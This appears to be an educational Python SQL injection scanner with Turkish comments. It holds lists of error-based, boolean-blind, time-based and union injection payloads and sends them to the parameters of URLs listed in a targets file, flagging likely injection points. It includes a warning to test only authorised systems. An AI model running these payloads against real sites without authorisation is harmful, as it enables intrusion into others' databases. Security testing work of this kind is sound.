# sqli_scan.py

import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# Gerekli kütüphaneleri içe aktarıyoruz
import requests # HTTP istekleri göndermek için kullanılır
import time # Zaman tabanlı SQLi testlerinde süre ölçümü için kullanılır
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse # URL'leri parçalamak, sorgu parametrelerini ayrıştırmak, birleştirmek ve yeniden oluşturmak için kullanılır

# --- Payload Listeleri (SQLi Türlerine Göre) ---
# Bu listeler, farklı SQL Injection türlerini tetiklemek için kullanılan karakter dizileridir.
# Gerçek bir tarayıcıda bu listeler çok daha kapsamlı olmalıdır.

# Error-Based SQL Injection Payloadları:
# Bu payloadlar, veritabanından doğrudan bir hata mesajı döndürmeyi hedefler.
# Hata mesajları, zafiyetin varlığını ve bazen veritabanı türünü/yapısını ortaya çıkarabilir.
error_based_payloads = [
    "'", "''", "\"", "\\", "`", "``", # Temel syntax hataları tetikleyiciler
    "1' OR '1'='1", # Her zaman doğru bir koşul ekleyerek syntax hatası veya beklenmedik sonuç arar
    "1' OR '1'='1' -- ", # Yorum işareti (MySQL, SQL Server) ile sorgunun geri kalanını devre dışı bırakır
    "1' OR '1'='1' #", # Yorum işareti (MySQL)
    "1' OR 1=1 -- ", # Sayısal parametreler için benzer bir deneme
    "1 OR 1=1", # Tırnaksız parametreler için
    "1' AND 1=CONVERT(int, @@version) -- ", # SQL Server'a özgü, sürüm bilgisini integer'a çevirmeye çalışarak hata tetikler
    # ... Diğer veritabanları (PostgreSQL, Oracle vb.) için özel hata tetikleyici payloadlar eklenebilir.
]

# Boolean-Based Blind SQL Injection Payloadları:
# Bu payloadlar, sorguya eklenen koşulun sonucuna (Doğru/Yanlış) göre uygulamanın yanıtında
# gözlemlenebilir bir fark yaratmayı hedefler (örneğin, sayfa içeriğinin değişmesi).
# Yanıtta doğrudan hata veya veri görünmez.
boolean_based_payloads = {
    # Koşul doğru olduğunda (örn: 1=1) gönderilecek payload
    'true': "' AND '1'='1", # String parametre için. Sayısal için ' AND 1=1 -- olabilir.
    # Koşul yanlış olduğunda (örn: 1=2) gönderilecek payload
    'false': "' AND '1'='2" # String parametre için. Sayısal için ' AND 1=2 -- olabilir.
}

# Time-Based Blind SQL Injection Payloadları:
# Bu payloadlar, veritabanını belirli bir süre (örn: 5 saniye) beklemeye zorlar.
# Eğer uygulamanın yanıtı belirtilen süre kadar gecikirse, bu zafiyetin bir göstergesidir.
# Yanıtta doğrudan hata veya veri görünmez.
time_based_payloads = [
    "' AND SLEEP(5) -- ", # MySQL için 5 saniye bekletme komutu
    "' AND pg_sleep(5) -- ", # PostgreSQL için 5 saniye bekletme komutu
    "' WAITFOR DELAY '0:0:5' -- ", # SQL Server için 5 saniye bekletme komutu
    # ... Diğer veritabanları (Oracle vb.) için özel zaman geciktirme payloadları eklenebilir.
]

# Union-Based SQL Injection Payloadları:
# Bu payloadlar, orijinal sorgunun sonuç kümesiyle ek bir SELECT sorgusunun sonuçlarını birleştirmeyi hedefler.
# Başarılı olursa, saldırganın istediği verileri (örn: kullanıcı adları, parolalar) çekmesini sağlar.
# Bu tür genellikle sütun sayısının doğru tahmin edilmesini gerektirir.
# Şimdilik basit örnekler:
union_based_payloads = [
    "' UNION SELECT null -- ", # Tek sütunlu bir tablo varsayımıyla deneme
    "' UNION SELECT null, null -- ", # İki sütunlu bir tablo varsayımıyla deneme
    "' UNION SELECT null, null, null -- ", # Üç sütunlu bir tablo varsayımıyla deneme
    # ... Sütun sayısını artırarak denemeler devam edebilir.
    # Gerçek kullanımda, sütun sayısı genellikle 'ORDER BY' veya 'GROUP BY' ifadeleriyle tespit edilir.
]

# --- Test Fonksiyonları (Her SQLi Türü İçin Ayrı) ---

def test_error_based(session, url, params, method='GET'):
    """
    Verilen URL ve parametreler üzerinde Error-Based SQL Injection denemesi yapar.
    Veritabanı hata mesajlarını yanıtta arar.

    Args:
        session (requests.Session): İstekler için kullanılacak session objesi.
        url (str): Test edilecek temel URL (parametreler hariç).
        params (dict): Test edilecek orijinal URL parametreleri.
        method (str, optional): HTTP metodu ('GET' veya 'POST'). Varsayılan 'GET'.

    Returns:
        bool: Zafiyet bulunursa True, bulunmazsa False döner.
    """
    print(f"--- Error-Based Test Başlatılıyor: {url} ---")
    vulnerable = False # Başlangıçta zafiyet bulunmadığını varsayalım
    original_param_values = params.copy() # Orijinal parametreleri korumak için kopyasını alıyoruz

    # URL'deki her bir parametre için döngü başlatıyoruz
    for param_name, param_value in original_param_values.items():
        print(f"  Parametre test ediliyor: {param_name}")
        # Tanımlı her bir error-based payload için döngü başlatıyoruz
        for payload in error_based_payloads:
            # Test için yeni parametre setini hazırlıyoruz
            test_params = original_param_values.copy()
            # Mevcut parametrenin orijinal değerine payload'ı ekliyoruz
            # str(param_value) ile parametre değerinin string olduğundan emin oluyoruz
            test_params[param_name] = str(param_value) + payload

            try:
                # Eğer HTTP metodu GET ise
                if method.upper() == 'GET':
                    # URL'i, payload eklenmiş yeni parametrelerle yeniden oluşturuyoruz
                    parts = urlparse(url) # URL'i bileşenlerine ayır (scheme, netloc, path, etc.)
                    query = urlencode(test_params) # Parametreleri URL uyumlu string'e çevir (örn: key1=value1&key2=value2)
                    test_url = urlunparse(parts._replace(query=query)) # URL bileşenlerini yeni query ile birleştir
                    # Payload içeren URL'e GET isteği gönderiyoruz (10 saniye timeout ile)
                    response = session.get(test_url, timeout=10)
                # Eğer HTTP metodu POST ise
                elif method.upper() == 'POST':
                     # Payload içeren veriyi POST isteği ile gönderiyoruz (10 saniye timeout ile)
                    response = session.post(url, data=test_params, timeout=10)
                # Desteklenmeyen bir metod ise uyarı verip sonraki parametreye geçiyoruz
                else:
                    print(f"  Desteklenmeyen metod: {method}")
                    continue # Bu payload'ı atla, döngünün sonraki adımına geç

                # HTTP yanıtının içeriğinde bilinen SQL hata göstergelerini arıyoruz
                # Bu liste daha kapsamlı olabilir
                sql_error_indicators = ["SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB", "error in your SQL", "Warning: mysql_"]
                for error in sql_error_indicators:
                    # Hata göstergesi (küçük harfe çevrilmiş) yanıt içeriğinde (küçük harfe çevrilmiş) bulunuyorsa
                    if error.lower() in response.text.lower():
                        # Potansiyel bir zafiyet bulunduğunu işaretliyoruz
                        print(f"[!!!] Potansiyel Error-Based SQL Injection Bulundu!")
                        print(f"  URL/Parametre: {url} / {param_name}")
                        print(f"  Payload: {payload}")
                        vulnerable = True # Zafiyet bulundu
                        return vulnerable # Zafiyet bulunduğu için bu fonksiyonun çalışmasını durdur ve True dön (isteğe bağlı, tüm payloadları denemek yerine ilk bulguda durur)

            # İstek gönderirken bir hata oluşursa (örn: bağlantı hatası, timeout)
            except requests.exceptions.RequestException as e:
                print(f"  Hata: İstek gönderilemedi. {e}")
                # Hata durumunda bir sonraki payload'a geçiyoruz
                continue
        # Belirli bir parametre için tüm error-based payloadlar denendiğinde mesaj yazdırıyoruz
        print(f"  Parametre {param_name} için Error-Based test tamamlandı.")
    # Tüm parametreler test edildikten sonra fonksiyonun bittiğini belirtiyoruz
    print(f"--- Error-Based Test Tamamlandı: {url} ---")
    # Zafiyet bulunup bulunmadığı bilgisini döndürüyoruz
    return vulnerable

def test_boolean_based(session, url, params, method='GET'):
    """
    Verilen URL ve parametreler üzerinde Boolean-Based Blind SQL Injection denemesi yapar.
    Doğru ve yanlış koşullar enjekte edildiğinde yanıt içeriğindeki farklılıkları arar.

    Args:
        session (requests.Session): İstekler için kullanılacak session objesi.
        url (str): Test edilecek temel URL (parametreler hariç).
        params (dict): Test edilecek orijinal URL parametreleri.
        method (str, optional): HTTP metodu ('GET' veya 'POST'). Varsayılan 'GET'.

    Returns:
        bool: Zafiyet bulunursa True, bulunmazsa False döner.
    """
    print(f"--- Boolean-Based Test Başlatılıyor: {url} ---")
    vulnerable = False # Başlangıçta zafiyet bulunmadığını varsayalım
    original_param_values = params.copy() # Orijinal parametreleri koru

    # Her bir parametre için döngü
    for param_name, param_value in original_param_values.items():
        print(f"  Parametre test ediliyor: {param_name}")
        try:
            # 1. Orijinal isteği yap ve yanıtın boyutunu (içerik uzunluğunu) kaydet
            if method.upper() == 'GET':
                original_response = session.get(url, params=original_param_values, timeout=10)
            elif method.upper() == 'POST':
                original_response = session.post(url, data=original_param_values, timeout=10)
            else: continue # Desteklenmeyen metod ise atla
            original_len = len(original_response.text) # Orijinal yanıtın karakter sayısı

            # 2. 'True' koşulu içeren payload'ı enjekte et ve yanıt boyutunu al
            true_params = original_param_values.copy()
            true_params[param_name] = str(param_value) + boolean_based_payloads['true'] # 'True' payload'ını ekle
            if method.upper() == 'GET':
                true_response = session.get(url, params=true_params, timeout=10)
            elif method.upper() == 'POST':
                true_response = session.post(url, data=true_params, timeout=10)
            true_len = len(true_response.text) # 'True' payload'lı yanıtın karakter sayısı

            # 3. 'False' koşulu içeren payload'ı enjekte et ve yanıt boyutunu al
            false_params = original_param_values.copy()
            false_params[param_name] = str(param_value) + boolean_based_payloads['false'] # 'False' payload'ını ekle
            if method.upper() == 'GET':
                false_response = session.get(url, params=false_params, timeout=10)
            elif method.upper() == 'POST':
                false_response = session.post(url, data=false_params, timeout=10)
            false_len = len(false_response.text) # 'False' payload'lı yanıtın karakter sayısı

            # 4. Yanıt uzunluklarını karşılaştır
            # Eğer 'True' durumu orijinal yanıtla aynı uzunlukta VE 'False' durumu orijinal yanıttan farklı uzunluktaysa,
            # bu durum Boolean-Based Blind SQLi zafiyetinin güçlü bir göstergesidir.
            # Not: Bu kontrol çok basittir. Gerçek dünyada, sayfa içeriklerinin benzerlik oranları gibi
            # daha gelişmiş karşılaştırma teknikleri kullanılabilir, çünkü yanıt uzunlukları yanıltıcı olabilir.
            if true_len == original_len and false_len != original_len:
                print(f"[!!!] Potansiyel Boolean-Based Blind SQL Injection Bulundu!")
                print(f"  URL/Parametre: {url} / {param_name}")
                print(f"  Durum: True({true_len}) == Original({original_len}), False({false_len}) != Original")
                vulnerable = True # Zafiyet bulundu
                return vulnerable # İlk bulguda fonksiyonu durdur ve True dön

        # İstek sırasında hata oluşursa
        except requests.exceptions.RequestException as e:
            print(f"  Hata: İstek gönderilemedi. {e}")
            continue # Sonraki parametreye geç
        # Parametre testi bittiğinde mesaj yazdır
        print(f"  Parametre {param_name} için Boolean-Based test tamamlandı.")
    # Tüm parametreler test edildikten sonra mesaj yazdır
    print(f"--- Boolean-Based Test Tamamlandı: {url} ---")
    # Zafiyet durumunu döndür
    return vulnerable


def test_time_based(session, url, params, method='GET', delay=5):
    """
    Verilen URL ve parametreler üzerinde Time-Based Blind SQL Injection denemesi yapar.
    Veritabanını beklemeye zorlayan payloadlar gönderir ve yanıt süresini ölçer.

    Args:
        session (requests.Session): İstekler için kullanılacak session objesi.
        url (str): Test edilecek temel URL (parametreler hariç).
        params (dict): Test edilecek orijinal URL parametreleri.
        method (str, optional): HTTP metodu ('GET' veya 'POST'). Varsayılan 'GET'.
        delay (int, optional): Payload'da kullanılacak ve beklenecek gecikme süresi (saniye). Varsayılan 5.

    Returns:
        bool: Zafiyet bulunursa True, bulunmazsa False döner.
    """
    print(f"--- Time-Based Test Başlatılıyor: {url} (Gecikme: {delay}s) ---")
    vulnerable = False # Başlangıçta zafiyet yok
    original_param_values = params.copy() # Orijinal parametreleri koru

    # Her bir parametre için döngü
    for param_name, param_value in original_param_values.items():
        print(f"  Parametre test ediliyor: {param_name}")
        # Tanımlı her bir time-based payload şablonu için döngü
        for payload_template in time_based_payloads:
            # Payload'ı, belirtilen 'delay' süresini içerecek şekilde oluşturuyoruz.
            # Farklı veritabanları için farklı bekleme komutları (SLEEP, pg_sleep, WAITFOR DELAY) kullanılır.
            # Bu yüzden payload şablonundaki varsayılan süreyi (örn: 5) istenen 'delay' ile değiştiriyoruz.
            payload = str(param_value) + payload_template.replace("SLEEP(5)", f"SLEEP({delay})").replace("pg_sleep(5)", f"pg_sleep({delay})").replace("'0:0:5'", f"'0:0:{delay}'")

            # Test parametrelerini hazırlıyoruz
            test_params = original_param_values.copy()
            test_params[param_name] = payload # Payload'ı ilgili parametreye atıyoruz

            try:
                # İstek göndermeden hemen önce zamanı kaydediyoruz
                start_time = time.time()
                # HTTP metoduna göre isteği gönderiyoruz
                if method.upper() == 'GET':
                    # GET için URL'i yeniden oluşturuyoruz
                    parts = urlparse(url)
                    query = urlencode(test_params)
                    test_url = urlunparse(parts._replace(query=query))
                    # Timeout süresini, beklenen gecikmeden biraz daha fazla ayarlıyoruz (örn: delay + 10 saniye)
                    # Bu, ağ gecikmeleri veya sunucu yavaşlıkları nedeniyle yanlış negatifleri önlemeye yardımcı olur.
                    response = session.get(test_url, timeout=delay + 10)
                elif method.upper() == 'POST':
                    # POST için veriyi gönderiyoruz, yine timeout ayarlı
                    response = session.post(url, data=test_params, timeout=delay + 10)
                else: continue # Desteklenmeyen metod ise atla
                # İstek tamamlandıktan sonra zamanı tekrar kaydediyoruz
                end_time = time.time()

                # İsteğin ne kadar sürdüğünü hesaplıyoruz
                elapsed_time = end_time - start_time
                # Hangi payload'ın ne kadar sürdüğünü yazdırıyoruz (bilgi amaçlı)
                print(f"    Payload: {payload_template.strip()} -> Süre: {elapsed_time:.2f}s")

                # Eğer geçen süre, beklenen gecikme süresinden ('delay') büyük veya eşitse
                # (Ağ gecikmelerini hesaba katmak için küçük bir pay bırakılabilir, ama >= delay genellikle yeterlidir)
                if elapsed_time >= delay:
                    # Potansiyel bir time-based zafiyet bulunduğunu işaretliyoruz
                    print(f"[!!!] Potansiyel Time-Based Blind SQL Injection Bulundu!")
                    print(f"  URL/Parametre: {url} / {param_name}")
                    print(f"  Payload: {payload_template.strip()}")
                    print(f"  Tespit Edilen Gecikme: {elapsed_time:.2f}s")
                    vulnerable = True # Zafiyet bulundu
                    return vulnerable # İlk bulguda fonksiyonu durdur ve True dön

            # Eğer istek, ayarladığımız timeout süresini aşarsa (requests.exceptions.Timeout hatası)
            # Bu durum, payload'ın veritabanını başarıyla beklettiği anlamına gelebilir ve güçlü bir zafiyet göstergesidir.
            except requests.exceptions.Timeout:
                 print(f"[!!!] Potansiyel Time-Based Blind SQL Injection Bulundu! (Timeout)")
                 print(f"  URL/Parametre: {url} / {param_name}")
                 print(f"  Payload: {payload_template.strip()}")
                 vulnerable = True # Zafiyet bulundu
                 return vulnerable # Timeout durumunda da fonksiyonu durdur ve True dön
            # Diğer istek hataları (bağlantı vb.)
            except requests.exceptions.RequestException as e:
                print(f"  Hata: İstek gönderilemedi. {e}")
                continue # Sonraki payload'a geç
        # Parametre için tüm time-based payloadlar denendiğinde mesaj yazdır
        print(f"  Parametre {param_name} için Time-Based test tamamlandı.")
    # Tüm parametreler test edildikten sonra mesaj yazdır
    print(f"--- Time-Based Test Tamamlandı: {url} ---")
    # Zafiyet durumunu döndür
    return vulnerable

# --- Ana İşlem Fonksiyonu ---
def main():
    """
    Ana fonksiyon. Hedef URL'leri dosyadan okur, her biri için SQLi testlerini çalıştırır
    ve sonuçları raporlar.
    """
    target_file = "targets.txt" # Hedef URL'lerin bulunduğu dosyanın adı
    results = [] # Tarama sonuçlarını saklamak için boş bir liste oluşturuyoruz

    try:
        # Hedef dosyasını okuma modunda ('r') açıyoruz
        with open(target_file, 'r') as f:
            # Dosyadaki her satırı okuyoruz, başındaki/sonundaki boşlukları temizliyoruz (strip)
            # ve satır boş değilse veya '#' ile başlamıyorsa (yorum satırı değilse) listeye ekliyoruz
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    # Eğer dosya bulunamazsa hata mesajı yazdırıp programı sonlandırıyoruz
    except FileNotFoundError:
        print(f"Hata: Hedef dosyası '{target_file}' bulunamadı.")
        return

    # İstekler için bir Session objesi kullanmak daha verimlidir.
    # Session, çerezleri (cookies) otomatik yönetir ve TCP bağlantılarını yeniden kullanarak performansı artırır (connection pooling).
    session = requests.Session()
    # Bazı web siteleri veya WAF'lar (Web Application Firewall) standart dışı User-Agent'ları engelleyebilir.
    # Tanınabilir bir User-Agent belirlemek iyi bir pratiktir.
    session.headers.update({'User-Agent': 'MySqliTesterBot/1.0'})

    print(f"Toplam {len(urls)} hedef test edilecek...")

    # Dosyadan okunan her bir URL için döngü başlatıyoruz
    for url in urls:
        print(f"\n[*] Hedef Test Ediliyor: {url}")
        vulnerable_found = False # Bu URL için henüz zafiyet bulunmadığını varsayıyoruz

        try:
            # URL'i bileşenlerine ayırıyoruz (scheme, netloc, path, query, fragment)
            parsed_url = urlparse(url)
            # Sorgu kısmını (query string) ayrıştırarak parametreleri bir sözlük (dictionary) olarak alıyoruz
            # parse_qs, değerleri liste olarak döndürür (örn: {'id': ['1'], 'cat': ['news']})
            query_params = parse_qs(parsed_url.query)
            # Değerleri listeden çıkarıp doğrudan string olarak almak için sözlüğü yeniden oluşturuyoruz
            # Örn: {'id': '1', 'cat': 'news'}
            params = {k: v[0] for k, v in query_params.items()}
            # URL'in sorgu parametreleri olmayan temel kısmını alıyoruz (örn: http://example.com/page.php)
            base_url = urlunparse(parsed_url._replace(query=''))

            # Eğer URL'de GET parametresi bulunmuyorsa (params sözlüğü boşsa)
            if not params:
                print("  Bu URL'de GET parametresi bulunamadı. Şimdilik atlanıyor.")
                # Not: Bu noktada POST parametrelerini test etmek veya Header'ları test etmek için
                # ek mantık eklenebilir. Şimdilik sadece GET parametrelerine odaklanıyoruz.
                continue # Sonraki URL'e geç

            # --- SQLi Testlerini Sırayla Çalıştır ---
            # Bir zafiyet türü bulunduğunda diğerlerini test etmeyi durdurabiliriz (isteğe bağlı).
            # Bu, tarama süresini kısaltabilir.

            # Henüz bu URL için zafiyet bulunmadıysa Error-Based testi çalıştır
            if not vulnerable_found:
                # test_error_based fonksiyonu True dönerse (zafiyet bulursa)
                if test_error_based(session, base_url, params, method='GET'):
                    vulnerable_found = True # Zafiyet bulundu olarak işaretle
                    # Sonuçları listeye ekle
                    results.append({'url': url, 'type': 'Error-Based', 'status': 'Vulnerable'})

            # Henüz zafiyet bulunmadıysa Boolean-Based testi çalıştır
            if not vulnerable_found:
                 if test_boolean_based(session, base_url, params, method='GET'):
                     vulnerable_found = True
                     results.append({'url': url, 'type': 'Boolean-Based Blind', 'status': 'Vulnerable'})

            # Henüz zafiyet bulunmadıysa Time-Based testi çalıştır (5 saniye gecikme ile)
            if not vulnerable_found:
                 # test_time_based fonksiyonuna gecikme süresini (delay) parametre olarak veriyoruz
                 if test_time_based(session, base_url, params, method='GET', delay=5):
                     vulnerable_found = True
                     results.append({'url': url, 'type': 'Time-Based Blind', 'status': 'Vulnerable'})

            # Union-Based ve Out-of-Band (OOB) SQLi testleri daha karmaşıktır.
            # Union-Based için önce doğru sütun sayısını bulmak gerekir (genellikle ORDER BY ile).
            # OOB için ise veritabanının dışarıya (örn: DNS, HTTP) istek yapmasını sağlamak gerekir.
            # Bu basit örnekte bu testler eklenmemiştir.

            # Eğer yukarıdaki testlerin hiçbiri zafiyet bulmadıysa
            if not vulnerable_found:
                print(f"  Bu URL için bilinen SQLi türlerinde zafiyet bulunamadı.")
                # Sonuç listesine zafiyet bulunamadığı bilgisini ekle
                results.append({'url': url, 'status': 'Not Vulnerable (Tested Types)'})

        # URL işlenirken veya testler sırasında beklenmedik bir hata oluşursa
        except Exception as e:
            print(f"  URL işlenirken genel bir hata oluştu: {url} - {e}")
            # Sonuç listesine hata bilgisini ekle
            results.append({'url': url, 'status': 'Error Processing'})

    # --- Tarama Sonuçlarını Göster/Kaydet ---
    print("\n--- TARAMA SONUÇLARI ---")
    vulnerable_count = 0 # Zafiyetli bulunan URL sayısını saymak için sayaç
    # Sonuçlar listesindeki her bir sonuç için döngü
    for result in results:
        # Sonucu ekrana yazdırıyoruz. result.get() metodu, anahtar yoksa hata vermek yerine None veya belirtilen varsayılan değeri döndürür.
        print(f"URL: {result['url']} - Durum: {result.get('status', 'N/A')} {result.get('type', '')}")
        # Eğer sonucun durumu 'Vulnerable' ise sayacı bir artır
        if result.get('status') == 'Vulnerable':
            vulnerable_count += 1

    # Tarama özeti
    print(f"\nTarama tamamlandı. Toplam {len(results)} URL test edildi.")
    print(f"{vulnerable_count} potansiyel zafiyetli URL bulundu.")

    # Sonuçları JSON formatında bir dosyaya kaydetme (isteğe bağlı)
    # import json # JSON kütüphanesini içe aktar
    # with open('scan_results.json', 'w') as outfile: # 'scan_results.json' dosyasını yazma modunda aç
    #     # results listesini JSON formatında, 4 boşluk girintiyle dosyaya yaz
    #     json.dump(results, outfile, indent=4)
    # print("Sonuçlar 'scan_results.json' dosyasına kaydedildi.")

# Bu Python betiği doğrudan çalıştırıldığında (__name__ değişkeni '__main__' olduğunda) aşağıdaki kod bloğu çalışır.
# Eğer bu betik başka bir Python betiği tarafından 'import' edilirse, bu blok çalışmaz.
if __name__ == "__main__":
    print("--- SQL Injection Test Aracı Başlatılıyor ---")
    # ÖNEMLİ UYARI: Bu tür araçların kullanımı yasal ve etik sonuçlar doğurabilir.
    # Sadece test etme yetkinizin olduğu sistemlerde kullanın.
    # İzinsiz sistemlerde test yapmak yasa dışıdır.
    print("[UYARI] Bu aracı yalnızca test etme izniniz olan sistemlerde kullanın!")
    # Ana işlem fonksiyonunu çağırarak taramayı başlat
    main()
    print("--- SQL Injection Test Aracı Tamamlandı ---")
